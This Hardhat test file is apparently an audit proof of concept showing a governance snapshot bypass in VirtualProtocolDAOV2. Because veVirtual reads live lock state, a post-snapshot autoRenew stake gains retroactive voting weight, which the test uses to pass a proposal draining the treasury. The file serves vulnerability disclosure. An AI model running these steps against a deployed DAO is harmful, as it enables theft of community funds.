/*
 * CRITICAL PoC — Governance snapshot bypass in VirtualProtocolDAOV2
 * ----------------------------------------------------------------
 * Root cause:
 *   - veVirtual.balanceOfAt(account, ts) (token/veVirtual.sol:93-102) reconstructs a
 *     "historical" balance by iterating the account's CURRENT live locks. There is no
 *     historical checkpoint — it reads present state.
 *   - For an autoRenew lock, _balanceOfLockAt (token/veVirtual.sol:124-126) returns full
 *     weight and RETURNS BEFORE the `ts < lock.start` guard at L128. So an autoRenew lock
 *     counts at full weight for ANY timestamp, including ones before the lock existed.
 *   - VirtualProtocolDAOV2._castVote -> _getVotes(account, proposalSnapshot) ->
 *     _token.balanceOfAt(account, snapshot) (governance/VirtualProtocolDAOV2.sol:231-236,256).
 *
 * Impact: the OZ proposal snapshot — the ONLY primitive that freezes voting power per
 * proposal — is fully nullified. An attacker who held ZERO governance power at the snapshot
 * can stake AFTER the snapshot and vote with full retroactive weight, passing & executing
 * an arbitrary proposal (here: draining the DAO treasury). Permissionless governance takeover.
 */
const { expect } = require("chai");
const { ethers, upgrades } = require("hardhat");
const { time } = require("@nomicfoundation/hardhat-network-helpers");

const E = ethers.parseEther;

describe("CRITICAL: VirtualProtocolDAOV2 governance snapshot bypass (veVirtual.balanceOfAt live-state read)", function () {
  it("zero-power-at-snapshot attacker passes & executes a treasury-draining proposal", async function () {
    const [deployer, proposer, honest, attacker] = await ethers.getSigners();

    // ---------- Token ----------
    const virtual = await ethers.deployContract("VirtualToken", [E("1000000000"), deployer.address]);

    // ---------- veVIRTUAL governance token (maxWeeks = 104) ----------
    const VeVirtual = await ethers.getContractFactory("veVirtual");
    const ve = await upgrades.deployProxy(VeVirtual, [virtual.target, 104]);
    await ve.waitForDeployment();

    // ---------- DAO: full OZ Governor ----------
    // constructor(token, votingDelay, votingPeriod, proposalThreshold, quorumNumerator, admin)
    const VOTING_DELAY = 60;        // seconds (clock is timestamp)
    const VOTING_PERIOD = 3600;     // 1 hour
    const PROPOSAL_THRESHOLD = 0;   // anyone may propose
    const QUORUM_NUMERATOR = 5000;  // 50% of admin-checkpointed total supply
    const dao = await ethers.deployContract("VirtualProtocolDAOV2", [
      ve.target, VOTING_DELAY, VOTING_PERIOD, PROPOSAL_THRESHOLD, QUORUM_NUMERATOR, deployer.address,
    ]);

    // ---------- Fund the DAO treasury (what the attacker will steal) ----------
    const TREASURY = E("500000");
    await virtual.transfer(dao.target, TREASURY);
    expect(await virtual.balanceOf(dao.target)).to.equal(TREASURY);

    // ---------- Realistic quorum: 50% of a 1000-ve electorate = 500 ve ----------
    const t0 = await time.latest();
    await dao.setTotalSupply(E("1000"), t0);

    // ---------- A legitimate, PRE-COMMITTED electorate that will try to defend ----------
    await virtual.transfer(honest.address, E("1000"));
    await virtual.connect(honest).approve(ve.target, ethers.MaxUint256);
    await ve.connect(honest).stake(E("400"), 104, true); // 400 ve, staked BEFORE the proposal exists

    // ---------- Fund the attacker, but DO NOT stake yet ----------
    await virtual.transfer(attacker.address, E("600"));
    await virtual.connect(attacker).approve(ve.target, ethers.MaxUint256);

    // ============ Malicious proposal: transfer the whole treasury to the attacker ============
    const targets = [virtual.target];
    const values = [0];
    const calldatas = [virtual.interface.encodeFunctionData("transfer", [attacker.address, TREASURY])];
    const description = "VP-IMPROVEMENT-001: routine parameter update"; // innocuous-looking
    const descHash = ethers.id(description);

    await dao.connect(proposer).propose(targets, values, calldatas, description);
    const proposalId = await dao.hashProposal(targets, values, calldatas, descHash);
    const snapshot = await dao.proposalSnapshot(proposalId); // proposeTime + votingDelay

    // At the snapshot the attacker has NOTHING.
    expect(await ve.numPositions(attacker.address)).to.equal(0n);
    const beforeStakeAtSnapshot = await ve.balanceOfAt(attacker.address, snapshot);
    expect(beforeStakeAtSnapshot).to.equal(0n);

    // Advance past the snapshot -> proposal becomes Active.
    await time.increaseTo(BigInt(snapshot) + 5n);
    expect(await dao.state(proposalId)).to.equal(1); // ProposalState.Active

    // Attacker stakes AFTER the snapshot, autoRenew = true (full weight).
    await ve.connect(attacker).stake(E("600"), 104, true);

    // ----- THE BUG, proven mechanically -----
    // Same historical query, same `snapshot` argument: 0 before, 600 after. History mutated.
    // The "before" value (0) IS the correct historical answer (attacker held nothing at snapshot);
    // a sound snapshot must be immutable, yet this one changed retroactively to 600.
    const afterStakeAtSnapshot = await ve.balanceOfAt(attacker.address, snapshot);
    expect(afterStakeAtSnapshot).to.equal(E("600"));

    // ----- Vote: honest electorate defends (400 Against), attacker rams it through (600 For) -----
    await dao.connect(honest).castVote(proposalId, 0);   // Against
    await dao.connect(attacker).castVote(proposalId, 1); // For (counted at full retroactive weight)

    const [against, forVotes] = await dao.proposalVotes(proposalId);
    expect(against).to.equal(E("400"));
    expect(forVotes).to.equal(E("600")); // attacker's post-snapshot stake counted in full

    // Advance past the deadline -> Succeeded (for>against AND for>=quorum(500)).
    const deadline = await dao.proposalDeadline(proposalId);
    await time.increaseTo(BigInt(deadline) + 5n);
    expect(await dao.state(proposalId)).to.equal(4); // ProposalState.Succeeded

    // ----- Execute: treasury drained to the attacker -----
    const before = await virtual.balanceOf(attacker.address);
    await dao.execute(targets, values, calldatas, descHash);
    const after = await virtual.balanceOf(attacker.address);

    expect(after - before).to.equal(TREASURY);                 // DIRECT FUND THEFT
    expect(await virtual.balanceOf(dao.target)).to.equal(0n);  // treasury emptied
    expect(await dao.state(proposalId)).to.equal(7);           // Executed

    console.log("\n  ===== CRITICAL CONFIRMED: governance snapshot bypass -> treasury drained =====");
    console.log("  attacker ve-power at snapshot BEFORE post-snapshot stake :", ethers.formatEther(beforeStakeAtSnapshot), "ve");
    console.log("  attacker ve-power at snapshot AFTER  post-snapshot stake :", ethers.formatEther(afterStakeAtSnapshot), "ve  <-- retroactive (correct answer is 0)");
    console.log("  votes  -> For:", ethers.formatEther(forVotes), " Against:", ethers.formatEther(against), " quorum: 500");
    console.log("  treasury stolen by attacker                              :", ethers.formatEther(after - before), "VIRTUAL");
    console.log("  ============================================================================\n");
  });
});
